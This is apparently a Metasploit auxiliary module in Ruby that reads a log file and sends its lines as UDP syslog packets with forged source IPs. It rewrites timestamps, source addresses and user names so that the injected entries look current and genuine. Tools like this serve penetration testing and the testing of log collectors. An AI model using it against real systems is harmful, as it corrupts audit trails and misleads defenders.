##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

# Thanks to Tod Beardsley for the guidance and showing me the error of my ways with the PacketFu stuff
# style guidlines, and the metasploit scanner module.

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

include Msf::Exploit::Capture
include Msf::Auxiliary::Scanner

	def initialize
		super(
			'Name'         => 'Syslog Spoofing from a log file.',
			'Version'      => '$Revision$',
			'Description'  => 'This module allows you to spoof Syslog messages read from a log file to and from single hosts or a range of hosts.  There are numerous on the fly substitutions/replacements that can be made by setting the advanced options in this module.  The TIMESTAMP_REPLACE advanced option has many of the common timestamp formats already specified and will allow you to simply choose from a list to replace them with the current timestamp, which can be useful in replaying old log files.  The SRCIP_REPLACE advanced option will replace any occurrence of the text string “src_ip” tag within the log message with the spoofed source IP, which can be useful for spoofing messages from multiple source IPs using the same log file.  Remember to edit the log file with the text string “src_ip” tag before playing the logs with this module.  The REGEX_REPLACE advanced option will allow you to replace any arbitrary text string within the log message by specifying a regular expression or string, which is useful for changing things like user names within the log message itself.',
			'Author'       => 'Jeremy Conway <jeremy[at]sudosecure.net>',
			'License'      => MSF_LICENSE
		)
		register_options(
				[
					OptPort.new('DPORT',[false, "Destination Port to send Syslog to.", 514]),
					OptAddressRange.new('SHOSTS',[true, "Source IP or CIDR network range to spoof sending syslog messages from."]),
					OptPath.new('LOGFILE',[true, "Syslog log file to read in from and send."]),
					OptBool.new('SYSLOG_HEADER',[false, "Generate Syslog header (Not always needed). Set Advanced options PRI,SHTS,SHHOST", false]),
					OptBool.new('VERBOSE',[false, "Verbose Ouptput?", false]),
					OptBool.new('TEST',[false, "Don't send packets, just display in console what would be sent.", false]),
					OptBool.new('UTC',[false, "Use UTC timestamps? If not defaults to localtime.", false]),
					OptInt.new('COUNT', [false, "Number of intervals to loop",1]),
					OptString.new('DELAY', [false, "Delay in seconds between messages",0])
				],self.class)
		
		register_advanced_options(
				[
					OptBool.new('SHTS',[false, "Add standard syslog header timestamp? (Jan 1 21:01:59)", false]),
					OptBool.new('SHHOST',[false, "Add Source IP to Syslog header?",false]),
					OptBool.new('PRI',[false, "Calculate priority? (FACILITY * 8 + SEVERITY)", false]),
					OptInt.new('FACILITY',[false, "Syslog Facilities (0-23) RFC 3164",0]),
					OptInt.new('SEVERITY',[false, "Syslog Severities (0-7) RFC 3164",0]),
					OptString.new('APPNAME',[false, "Syslog App Name (sshd[12345])"]),
					OptBool.new('SRCIP_REPLACE',[false, "Replaces string \"src_ip\" in log file with spoofed source IP.", false]),
					OptEnum.new('TIMESTAMP_REPLACE', [false, '1 => (Jan  1 1990 21:01:59), 2 => (Jan 01 1990 21:01:59), 3=> (Jan  1 21:01:59), 4 => (Jan 01 21:01:59), 5 => (Thu Jan  1 21:01:59 1990), 6 => (Thu Jan 01 21:01:59 1990), 7 => (01-18-1990      21:01:59), 8 => (01/Jan/1990:21:01:59), 9 => (01181990 21:01:59), 10 => (01/18/90 21:01:59), 11 => (18/01/1990 21:01:59)', 'none', ['none','1','2','3','4','5','6','7','8','9','10','11']]),
					OptString.new('REGEX_REPLACE',[false, "Replaces specified regex string matches in log file. Format for using this options is: match_regex/new_string. NOTE: You will need to escape special characters using the escape character backslash (\"\\\")."])
                		], self.class)
		deregister_options('FILTER','PCAPFILE','SNAPLEN','TIMEOUT','NETMASK')

	end

	#RFC 3164
	def cal_pri (fac, sev)
		return (fac*8+sev)
	end

	def gen_header(sip)
		time = Time.new
		header = ''
		if( datastore['PRI'] )
        		header << "<" << cal_pri(datastore['FACILITY'],datastore['SEVERITY']).to_s << ">"
             	end
               	if( datastore['SHTS'])
                   	if( datastore['UTC'])
				header << time.utc.strftime("%b %e %H:%M:%S ")
                   	else
				header << time.strftime("%b %e %H:%M:%S ")
			end
             	end
             	if( datastore['SHHOST'])
                 	header << sip << " "
            	end
             	if( datastore['APPNAME'])
               		header << datastore['APPNAME'] << ": "
             	end
		return header
	end

	def fix_timestamp(line,time_format,regex,utc)
		time = Time.new
       		if(utc)
			line = line.gsub(/#{regex}/, time.utc.strftime("#{time_format}"))
		else
			line = line.gsub(/#{regex}/, time.strftime("#{time_format}"))
		end
		return (line)
	end

	def gen_payload(sip,line)
		header = ''
		payload = ''
		if( datastore['SYSLOG_HEADER'])
			header = gen_header(sip)
		end
		if( datastore['SRCIP_REPLACE'])
			line = line.gsub(/src_ip/, sip)
		end
		if( datastore['REGEX_REPLACE'])
			regex = datastore['REGEX_REPLACE'].split('/')
			line = line.gsub(/#{regex.first}/, regex.last)
		end
		if( datastore['TIMESTAMP_REPLACE'])
			time_regex = ''
			time_format = ''
			if( datastore['TIMESTAMP_REPLACE'] == '1')
				#Jan 1 1990 21:01:59
				time_regex << '\w{3}\s+\d{1,2}\s\d{4}\s\d{2}:\d{2}:\d{2}'
				time_format << "%b %e %Y %T"
			elsif( datastore['TIMESTAMP_REPLACE'] == '2')
				#Jan 01 1990 21:01:59
				time_regex << '\w{3}\s\d{2}\s\d{4}\s\d{2}:\d{2}:\d{2}'
				time_format << "%b %d %Y %T"
			elsif( datastore['TIMESTAMP_REPLACE'] == '3')
				#Jan 1 21:01:59
				time_regex << '\w{3}\s+\d{1,2}\s\d{2}:\d{2}:\d{2}'
				time_format << "%b %e %T"
			elsif( datastore['TIMESTAMP_REPLACE'] == '4')
				#Jan 01 21:01:59
				time_regex << '\w{3}\s+\d{2}\s\d{2}:\d{2}:\d{2}'
				time_format << "%b %d %T"
			elsif( datastore['TIMESTAMP_REPLACE'] == '5')
				#Thu Jan  1 21:01:59 1990
				time_regex << '\w{3}\s\w{3}\s+\d{1,2}\s\d{2}:\d{2}:\d{2}\s\d{4}'
				time_format << "%a %b %e %T %Y"
			elsif( datastore['TIMESTAMP_REPLACE'] == '6')
				#Thu Jan 01 21:01:59 1990
				time_regex << '\w{3}\s\w{3}\s\d{2}\s\d{2}:\d{2}:\d{2}\s\d{4}'
				time_format << "%a %b %d %T %Y"
			elsif( datastore['TIMESTAMP_REPLACE'] == '7')
				#01-18-1990      21:01:59
				time_regex << '\d{2}-\d{2}-\d{4}\s+\d{2}:\d{2}:\d{2}'
				time_format << "%m-%d-%Y %T"
			elsif( datastore['TIMESTAMP_REPLACE'] == '8')
				#01/Jan/1990:21:01:59
				time_regex << '\d{2}/\w{3}/\d{4}:\d{2}:\d{2}:\d{2}'
				time_format << "%d/%b/%Y:%T"
			elsif( datastore['TIMESTAMP_REPLACE'] == '9')
				#01181990 21:01:59
				time_regex << '\d{8}\s\d{2}:\d{2}:\d{2}'
				time_format << "%m%d%Y %T"
			elsif( datastore['TIMESTAMP_REPLACE'] == '10')
				#01/18/90 21:01:59
				time_regex << '\d{2}/\d{2}/\d{2}\s\d{2}:\d{2}:\d{2}'
				time_format << "%m/%d/%y %T"
			elsif( datastore['TIMESTAMP_REPLACE'] == '11')
				#18/01/1990 21:01:59
				time_regex << '\d{2}/\d{2}/\d{4}\s\d{2}:\d{2}:\d{2}'
				time_format << "%d/%m/%y %T"
			end
			line = fix_timestamp(line,time_format,time_regex,datastore['UTC'])
		end
		payload << header << line
		return (payload)
	end

	def send_syslog(sip,sport,ip,dport,line)
		pkt = PacketFu::UDPPacket.new
		pkt.udp_sport=sport.to_i
		pkt.udp_dport=dport.to_i
		pkt.ip_saddr=sip
		pkt.ip_daddr=ip
		pkt.payload << gen_payload(sip,line)
		pkt.recalc
		capture_sendto(pkt,ip) unless datastore['TEST']
		if(datastore['VERBOSE'] || datastore['TEST'])
			print_status("#{sip}:#{pkt.udp_sport} --> #{ip}:#{dport}\t#{pkt.payload.size > 50 ? pkt.payload[0,50] + "..." : pkt.payload}")
		end
	end
	
	def run_host(ip)
		open_pcap()
		src_iplist = Rex::Socket::RangeWalker.new(datastore['SHOSTS'])
		dport=datastore['DPORT']
		sentmsgs=0
		time = Time.now
		(1..datastore['COUNT']).each do
			logfile=File.new("#{datastore['LOGFILE']}", "r")
			while( line = logfile.gets)
				sport=rand(0xffff-1024) + 1024
				src_iplist.reset
				src_iplist.each do |sip|
					send_syslog(sip,sport,ip,dport,line)
					sentmsgs+=1
				end
				if( datastore['DELAY'].to_f > 0)
					select(nil,nil,nil,datastore['DELAY'].to_f)
				end
			end
			logfile.close
		end
		time_diff = sprintf('%.2f', (Time.new - time))
		print_status("Total Syslog Messages Sent: #{sentmsgs} in #{time_diff} seconds.")
	end
end
